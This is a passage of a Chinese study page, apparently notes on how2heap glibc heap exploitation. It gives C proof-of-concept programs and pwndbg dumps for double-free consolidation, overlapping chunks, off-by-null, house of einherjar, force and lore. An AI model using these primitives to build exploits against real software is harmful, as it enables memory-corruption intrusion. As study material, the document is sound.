0xa0 [  7]: 0x7fffffffdce0 —▸ 0x4053a0 —▸ 0x4056c0 —▸ 0x405620 —▸ 0x405580 —▸ 0x4054e0 —▸ 0x405440 ◂— 0x0
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x0
smallbins
0xa0 [corrupted]
FD: 0x405390 —▸ 0x4056c0 ◂— 0x0
BK: 0x7fffffffdce0 ◂— 0x0
largebins
empty<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="fastbin-dup-consolidate-double-free"><a href="#fastbin-dup-consolidate-double-free" class="headerlink" title="fastbin_dup_consolidate(double free)"></a>fastbin_dup_consolidate(double free)</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;assert.h&gt;

void main() &#123;
	void *ptr[7];

	for(int i &#x3D; 0; i &lt; 7; i++)
		ptr[i] &#x3D; malloc(0x40);
	for(int i &#x3D; 0; i &lt; 7; i++)
		free(ptr[i]);

	void* p1 &#x3D; calloc(1,0x40);
  	free(p1);

  	void* p3 &#x3D; malloc(0x400);
	assert(p1 &#x3D;&#x3D; p3);

	free(p1);
	void *p4 &#x3D; malloc(0x400);
	assert(p4 &#x3D;&#x3D; p3);
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>利用了<code>double free</code>和<code>calloc</code>不会从<code>tcache</code>取堆的原理</p>
<p>填满<code>tcache</code>再释放一个堆到<code>fast bin</code></p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; bin
tcachebins
0x50 [  7]: 0x405850 —▸ 0x405800 —▸ 0x4057b0 —▸ 0x405760 —▸ 0x405710 —▸ 0x4056c0 —▸ 0x405670 ◂— 0x0
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x405890 ◂— 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x0
smallbins
empty
largebins
empty<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>创建一个属于<code>small bin</code>的堆然后再次释放<code>fast bin</code>里的堆，此时<code>fast bin</code>中的堆被和那个大于<code>small bin</code>的堆合并了</p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; bin
tcachebins
0x50 [  7]: 0x405850 —▸ 0x405800 —▸ 0x4057b0 —▸ 0x405760 —▸ 0x405710 —▸ 0x4056c0 —▸ 0x405670 ◂— 0x0
0x410 [  1]: 0x4058a0 ◂— 0x0
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x0
smallbins
empty
largebins
empty<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>申请出合并的堆即可申请到那个大的堆了且它并没有被释放</p>
<h3 id="overlapping-chunks-off-by-one"><a href="#overlapping-chunks-off-by-one" class="headerlink" title="overlapping_chunks(off-by-one)"></a>overlapping_chunks(off-by-one)</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;stdint.h&gt;
#include &lt;assert.h&gt;

int main(int argc , char* argv[])
&#123;
	setbuf(stdout, NULL);

	intptr_t *p1,*p2,*p3,*p4;
    
	p1 &#x3D; malloc(0x500 - 8);
	p2 &#x3D; malloc(0x500 - 8);
	p3 &#x3D; malloc(0x80 - 8);

	memset(p1, &#39;1&#39;, 0x500 - 8);
	memset(p2, &#39;2&#39;, 0x500 - 8);
	memset(p3, &#39;3&#39;, 0x80 - 8);

	free(p2);

	int evil_chunk_size &#x3D; 0x581;
	int evil_region_size &#x3D; 0x580 - 8;
    
	*(p2-1) &#x3D; evil_chunk_size; 
    
	p4 &#x3D; malloc(evil_region_size);

	memset(p4, &#39;4&#39;, evil_region_size);
	memset(p3, &#39;3&#39;, 80);

	assert(strstr((char *)p4, (char *)p3));
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>申请三个堆（前两个堆大于<code>tcache</code>)，利用第一个堆去修改第二个堆的内容，释放第二个堆进入<code>unsorted bin</code>之后改第二个堆的<code>size</code>为第二个堆和第三个堆的大小之和，再去创建这个大小的堆即可利用这个堆去覆写第三个堆而第三个堆仍然存在</p>
<p>先创建三个堆，并释放第二个堆</p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heap
Allocated chunk | PREV_INUSE
Addr: 0x405000
Size: 0x251

Allocated chunk | PREV_INUSE
Addr: 0x405250
Size: 0x501

Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x405750
Size: 0x501
fd: 0x7ffff7dcfca0
bk: 0x7ffff7dcfca0

Allocated chunk
Addr: 0x405c50
Size: 0x80

Top chunk | PREV_INUSE
Addr: 0x405cd0
Size: 0x20331<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>改第二个堆的<code>size</code>位使其覆盖下一个堆，此时已经看到第二个堆包含了第三个堆，再去创建出这个堆即可实现对第三个对的<code>overlap</code></p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heap
Allocated chunk | PREV_INUSE
Addr: 0x405000
Size: 0x251

Allocated chunk | PREV_INUSE
Addr: 0x405250
Size: 0x501

Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x405750
Size: 0x581
fd: 0x7ffff7dcfca0
bk: 0x7ffff7dcfca0

Top chunk | PREV_INUSE
Addr: 0x405cd0
Size: 0x20331<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="poison-null-byte-off-by-null"><a href="#poison-null-byte-off-by-null" class="headerlink" title="poison_null_byte(off-by-null)"></a>poison_null_byte(off-by-null)</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdint.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;malloc.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;assert.h></span></span>


<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
	<span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token class-name">uint8_t</span><span class="token operator">*</span> a<span class="token punctuation">;</span>
	<span class="token class-name">uint8_t</span><span class="token operator">*</span> b<span class="token punctuation">;</span>
	<span class="token class-name">uint8_t</span><span class="token operator">*</span> c<span class="token punctuation">;</span>
	<span class="token class-name">uint8_t</span><span class="token operator">*</span> b1<span class="token punctuation">;</span>
	<span class="token class-name">uint8_t</span><span class="token operator">*</span> b2<span class="token punctuation">;</span>
	<span class="token class-name">uint8_t</span><span class="token operator">*</span> d<span class="token punctuation">;</span>
	<span class="token keyword">void</span> <span class="token operator">*</span>barrier<span class="token punctuation">;</span>

	a <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">uint8_t</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x500</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">int</span> real_a_size <span class="token operator">=</span> <span class="token function">malloc_usable_size</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>
    
	b <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">uint8_t</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0xa00</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	c <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">uint8_t</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x500</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    barrier <span class="token operator">=</span>  <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	
    <span class="token class-name">uint64_t</span><span class="token operator">*</span> b_size_ptr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">uint64_t</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>b <span class="token operator">-</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>b<span class="token operator">+</span><span class="token number">0x9f0</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0xa00</span><span class="token punctuation">;</span>
	<span class="token function">free</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>
	
	a<span class="token punctuation">[</span>real_a_size<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>

	<span class="token class-name">uint64_t</span><span class="token operator">*</span> c_prev_size_ptr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">uint64_t</span><span class="token operator">*</span><span class="token punctuation">)</span>c<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">;</span>
	b1 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x500</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	b2 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x480</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">memset</span><span class="token punctuation">(</span>b2<span class="token punctuation">,</span><span class="token char">'B'</span><span class="token punctuation">,</span><span class="token number">0x480</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">free</span><span class="token punctuation">(</span>b1<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">free</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span>
	
	d <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0xc00</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">memset</span><span class="token punctuation">(</span>d<span class="token punctuation">,</span><span class="token char">'D'</span><span class="token punctuation">,</span><span class="token number">0xc00</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">assert</span><span class="token punctuation">(</span><span class="token function">strstr</span><span class="token punctuation">(</span>b2<span class="token punctuation">,</span> <span class="token string">"DDDDDDDDDDDD"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>同<code>2.23</code>,只要堆大小在<code>tcache</code>之上即可</p>
<h3 id="mmap-overlapping-chunks"><a href="#mmap-overlapping-chunks" class="headerlink" title="mmap_overlapping_chunks"></a>mmap_overlapping_chunks</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;
#include &lt;assert.h&gt;

int main()&#123;

	int* ptr1 &#x3D; malloc(0x10); 

	long long* top_ptr &#x3D; malloc(0x100000);
	long long* mmap_chunk_2 &#x3D; malloc(0x100000);
	long long* mmap_chunk_3 &#x3D; malloc(0x100000);
    
	mmap_chunk_3[-1] &#x3D; (0xFFFFFFFFFD &amp; mmap_chunk_3[-1]) + (0xFFFFFFFFFD &amp; mmap_chunk_2[-1]) | 2;
    
	free(mmap_chunk_3); 

	long long* overlapping_chunk &#x3D; malloc(0x300000);
    
	int distance &#x3D; mmap_chunk_2 - overlapping_chunk;
	overlapping_chunk[distance] &#x3D; 0x1122334455667788;

	assert(mmap_chunk_2[0] &#x3D;&#x3D; overlapping_chunk[distance]);
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>同<code>2.23</code></p>
<h3 id="house-of-einherjar-off-by-null-1"><a href="#house-of-einherjar-off-by-null-1" class="headerlink" title="house_of_einherjar(off-by-null)"></a>house_of_einherjar(off-by-null)</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;stdint.h&gt;
#include &lt;malloc.h&gt;
#include &lt;assert.h&gt;

int main()
&#123;
	setbuf(stdin, NULL);
	setbuf(stdout, NULL);

	uint8_t* a;
	uint8_t* b;
	uint8_t* d;

	a &#x3D; (uint8_t*) malloc(0x38);
	int real_a_size &#x3D; malloc_usable_size(a);

	size_t fake_chunk[6];

	fake_chunk[0] &#x3D; 0x100;
	fake_chunk[1] &#x3D; 0x100;
	fake_chunk[2] &#x3D; (size_t) fake_chunk; 
	fake_chunk[3] &#x3D; (size_t) fake_chunk; 
	fake_chunk[4] &#x3D; (size_t) fake_chunk; 
	fake_chunk[5] &#x3D; (size_t) fake_chunk; 

	b &#x3D; (uint8_t*) malloc(0x4f8);
	int real_b_size &#x3D; malloc_usable_size(b);
	uint64_t* b_size_ptr &#x3D; (uint64_t*)(b - 8);
    
	a[real_a_size] &#x3D; 0; 
	size_t fake_size &#x3D; (size_t)((b-sizeof(size_t)*2) - (uint8_t*)fake_chunk);
	*(size_t*)&amp;a[real_a_size-sizeof(size_t)] &#x3D; fake_size;

	fake_chunk[1] &#x3D; fake_size;

	free(b);
	d &#x3D; malloc(0x200);

	assert((long)d &#x3D;&#x3D; (long)&amp;fake_chunk[2]);
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>先创建两个堆和一个伪造的堆,第一个堆的大小要是<code>0x?8</code>用来溢出到下一个堆的<code>size</code>位实现<code>off-by-null</code></p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heap
Allocated chunk | PREV_INUSE
Addr: 0x405000
Size: 0x251

Allocated chunk | PREV_INUSE
Addr: 0x405250
Size: 0x41

Allocated chunk | PREV_INUSE
Addr: 0x405290
Size: 0x501

Top chunk | PREV_INUSE
Addr: 0x405790
Size: 0x20871<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; x&#x2F;20gx 0x7fffffffdd10
0x7fffffffdd10:	0x0000000000000100	0x0000000000000100		#prve_size    size
0x7fffffffdd20:	0x00007fffffffdd10	0x00007fffffffdd10		#fd           bk
0x7fffffffdd30:	0x00007fffffffdd10	0x00007fffffffdd10		#fd_nextsize  bknextsize<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>改第二个堆的<code>inuse</code>为<code>0</code>,即表示上一个堆已经释放，再伪造<code>fake_chunk</code>的大小和第二个堆的<code>size</code>,绕过<code>prve_size == fd-&gt;size</code>的检查</p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heap
Allocated chunk | PREV_INUSE
Addr: 0x405000
Size: 0x251

Allocated chunk | PREV_INUSE
Addr: 0x405250
Size: 0x41

Allocated chunk
Addr: 0x405290
Size: 0x500

Top chunk | PREV_INUSE
Addr: 0x405790
Size: 0x20871

pwndbg&gt; x&#x2F;20gx 0x405290
0x405290:	0xffff800000407580	0x0000000000000500
0x4052a0:	0x0000000000000000	0x0000000000000000
0x4052b0:	0x0000000000000000	0x0000000000000000
0x4052c0:	0x0000000000000000	0x0000000000000000
0x4052d0:	0x0000000000000000	0x0000000000000000
0x4052e0:	0x0000000000000000	0x0000000000000000
0x4052f0:	0x0000000000000000	0x0000000000000000
0x405300:	0x0000000000000000	0x0000000000000000
0x405310:	0x0000000000000000	0x0000000000000000<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; x&#x2F;20gx 0x7fffffffdd10
0x7fffffffdd10:	0x0000000000000100	0xffff800000407580
0x7fffffffdd20:	0x00007fffffffdd10	0x00007fffffffdd10
0x7fffffffdd30:	0x00007fffffffdd10	0x00007fffffffdd10<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>释放掉之后<code>fake_chunk</code>会和第二个堆合并，再次申请即可得到<code>fake_chunk</code>的地址</p>
<h3 id="house-of-force-top-chunk"><a href="#house-of-force-top-chunk" class="headerlink" title="house_of_force(top chunk)"></a>house_of_force(top chunk)</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;
#include &lt;stdint.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;stdint.h&gt;
#include &lt;malloc.h&gt;
#include &lt;assert.h&gt;

char bss_var[] &#x3D; &quot;This is a string that we want to overwrite.&quot;;

int main(int argc , char* argv[])
&#123;
	intptr_t *p1 &#x3D; malloc(256);
	int real_size &#x3D; malloc_usable_size(p1);
    
	intptr_t *ptr_top &#x3D; (intptr_t *) ((char *)p1 + real_size - sizeof(long));
	*(intptr_t *)((char *)ptr_top + sizeof(long)) &#x3D; -1;
	
	unsigned long evil_size &#x3D; (unsigned long)bss_var - sizeof(long)*4 - (unsigned long)ptr_top;	
	void *new_ptr &#x3D; malloc(evil_size);	

	void* ctr_chunk &#x3D; malloc(100);
	strcpy(ctr_chunk, &quot;YEAH!!!&quot;);

	assert(ctr_chunk &#x3D;&#x3D; bss_var);

&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>同<code>2.23</code></p>
<h3 id="house-of-lore-small-bin"><a href="#house-of-lore-small-bin" class="headerlink" title="house_of_lore(small bin)"></a>house_of_lore(small bin)</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;stdint.h&gt;
#include &lt;assert.h&gt;

void jackpot()&#123; fprintf(stderr, &quot;Nice jump d00d\n&quot;); exit(0); &#125;

int main(int argc, char * argv[])&#123;
  intptr_t* stack_buffer_1[4] &#x3D; &#123;0&#125;;
  intptr_t* stack_buffer_2[3] &#x3D; &#123;0&#125;;
    
  void* fake_freelist[7][4];    
  intptr_t *victim &#x3D; malloc(0x100);
  void *dummies[7];
    
  for(int i&#x3D;0; i&lt;7; i++) dummies[i] &#x3D; malloc(0x100);

  intptr_t *victim_chunk &#x3D; victim-2;

  for(int i&#x3D;0; i&lt;6; i++) &#123;
    fake_freelist[i][3] &#x3D; fake_freelist[i+1];
  &#125;
    
  fake_freelist[6][3] &#x3D; NULL;
    
  stack_buffer_1[0] &#x3D; 0;
  stack_buffer_1[1] &#x3D; 0;
  stack_buffer_1[2] &#x3D; victim_chunk;
  stack_buffer_1[3] &#x3D; (intptr_t*)stack_buffer_2;
  stack_buffer_2[2] &#x3D; (intptr_t*)stack_buffer_1;
  stack_buffer_2[3] &#x3D; (intptr_t *)fake_freelist[0];
  
  void *p5 &#x3D; malloc(1000);
  for(int i&#x3D;0; i&lt;7; i++) free(dummies[i]);
  free((void*)victim);

  void *p2 &#x3D; malloc(1200);
  victim[1] &#x3D; (intptr_t)stack_buffer_1; 
  for(int i&#x3D;0; i&lt;7; i++) malloc(0x100);

  void *p3 &#x3D; malloc(0x100);
  char *p4 &#x3D; malloc(0x100);
    
  intptr_t sc &#x3D; (intptr_t)jackpot;
  
  long offset &#x3D; (long)__builtin_frame_address(0) - (long)p4;
  memcpy((p4+offset+8), &amp;sc, 8); 
    
  assert((long)__builtin_return_address(0) &#x3D;&#x3D; (long)jackpot);
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>和<code>2.23</code>差不多，就是多了一个从<code>small bin</code>链表进入<code>tcache</code>的操作</p>
<p>先填满<code>tcache</code>并创建一个<code>small bin</code>，再创建一个堆防止合并</p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heap
Allocated chunk | PREV_INUSE
Addr: 0x405000
Size: 0x251

Free chunk (smallbins) | PREV_INUSE
Addr: 0x405250
Size: 0x111
fd: 0x7ffff7dcfda0
bk: 0x7ffff7dcfda0

Free chunk (tcache)
Addr: 0x405360
Size: 0x110
fd: 0x00

Free chunk (tcache) | PREV_INUSE
Addr: 0x405470
Size: 0x111
fd: 0x405370

Free chunk (tcache) | PREV_INUSE
Addr: 0x405580
Size: 0x111
fd: 0x405480

Free chunk (tcache) | PREV_INUSE
Addr: 0x405690
Size: 0x111
fd: 0x405590

Free chunk (tcache) | PREV_INUSE
Addr: 0x4057a0
Size: 0x111
fd: 0x4056a0

Free chunk (tcache) | PREV_INUSE
Addr: 0x4058b0
Size: 0x111
fd: 0x4057b0

Free chunk (tcache) | PREV_INUSE
Addr: 0x4059c0
Size: 0x111
fd: 0x4058c0

Allocated chunk | PREV_INUSE
Addr: 0x405ad0
Size: 0x3f1

Allocated chunk | PREV_INUSE
Addr: 0x405ec0
Size: 0x4c1

Top chunk | PREV_INUSE
Addr: 0x406380
Size: 0x1fc81<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; bin
tcachebins
0x110 [  7]: 0x4059d0 —▸ 0x4058c0 —▸ 0x4057b0 —▸ 0x4056a0 —▸ 0x405590 —▸ 0x405480 —▸ 0x405370 ◂— 0x0
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x0
smallbins
0x110: 0x405250 —▸ 0x7ffff7dcfda0 (main_arena+352) ◂— 0x405250 &#x2F;* &#39;PR@&#39; *&#x2F;
largebins
empty<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>再在栈上创建一个伪造的<code>free list</code>，将<code>fake_freelist</code>伪造成每<code>0x20</code>就链接到下一个地址，最后<code>0x80</code>不做操作</p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; x&#x2F;10gx 0x7fffffffdd20
0x7fffffffdd20:	0x0000000000000000	0x0000000000000000
0x7fffffffdd30:	0x0000000000405250	0x00007fffffffdd00
0x7fffffffdd40:	0x00007fffffffdda8	0x00000000000000f0
0x7fffffffdd50:	0x00000000000000c2	0x000000000040190d
0x7fffffffdd60:	0x0000000000405ed0	0x0000000000405ae0
pwndbg&gt; x&#x2F;10gx 0x7fffffffdd00
0x7fffffffdd00:	0x0000000000000000	0x0000000000000000
0x7fffffffdd10:	0x00007fffffffdd20	0x00007fffffffdc20
0x7fffffffdd20:	0x0000000000000000	0x0000000000000000
0x7fffffffdd30:	0x0000000000405250	0x00007fffffffdd00
0x7fffffffdd40:	0x00007fffffffdda8	0x00000000000000f0
...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>改<code>small bin</code>中的堆的<code>bk</code>为伪造的<code>free list</code>地址</p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; bin
tcachebins
0x110 [  7]: 0x4059d0 —▸ 0x4058c0 —▸ 0x4057b0 —▸ 0x4056a0 —▸ 0x405590 —▸ 0x405480 —▸ 0x405370 ◂— 0x0
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x0
smallbins
0x110 [corrupted]
FD: 0x405250 —▸ 0x7ffff7dcfda0 (main_arena+352) ◂— 0x405250 &#x2F;* &#39;PR@&#39; *&#x2F;
BK: 0x405250 —▸ 0x7fffffffdd20 —▸ 0x7fffffffdd00 —▸ 0x7fffffffdc20 —▸ 0x7fffffffdc40 ◂— ...
largebins
empty<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>清空<code>tcache</code>再创建一个堆，使得伪造的堆逆向链入<code>tcache</code>，这样再次申请就可以在<code>tcache</code>中申请到栈地址了</p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; bin
tcachebins
0x110 [  7]: 0x7fffffffdcb0 —▸ 0x7fffffffdc90 —▸ 0x7fffffffdc70 —▸ 0x7fffffffdc50 —▸ 0x7fffffffdc30 —▸ 0x7fffffffdd10 —▸ 0x7fffffffdd30 ◂— 0x0
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x0
smallbins
0x110 [corrupted]
FD: 0x405250 —▸ 0x7ffff7dcfda0 (main_arena+352) ◂— 0x405250 &#x2F;* &#39;PR@&#39; *&#x2F;
BK: 0x7fffffffdcc0 —▸ 0x7fffffffdce0 ◂— 0x0
largebins
empty<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heap
Allocated chunk | PREV_INUSE
Addr: 0x405000
Size: 0x251

Free chunk (smallbins) | PREV_INUSE
Addr: 0x405250
Size: 0x111
fd: 0x7ffff7dcfda0
bk: 0x7fffffffdd20

Allocated chunk | PREV_INUSE
Addr: 0x405360
Size: 0x111

Allocated chunk | PREV_INUSE
